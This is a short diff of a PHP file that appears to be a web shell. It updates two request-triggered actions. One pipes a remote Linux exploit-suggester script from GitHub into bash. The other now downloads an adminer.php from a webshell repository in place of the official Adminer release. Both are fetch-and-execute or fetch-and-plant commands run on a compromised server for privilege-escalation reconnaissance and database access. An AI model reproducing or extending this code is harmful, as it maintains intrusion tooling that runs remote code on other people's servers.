@@ -2084,12 +2084,12 @@ if($s_auth){
 
 	// spawn suggester
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='suggester')){
-		$s_result .= "<pre><code>".exe("curl -Lsk https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash")."</code></pre>";
+		$s_result .= "<pre><code>".exe("curl -Lsk https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh | bash")."</code></pre>";
 	}
 
 	// spawn adminer
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='adminer')){
-        	exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
+        	exe("wget https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/refs/heads/main/adminer.php -O adminer.php");
 		$s_result .= "Adminer Spawned";
 	}
 	
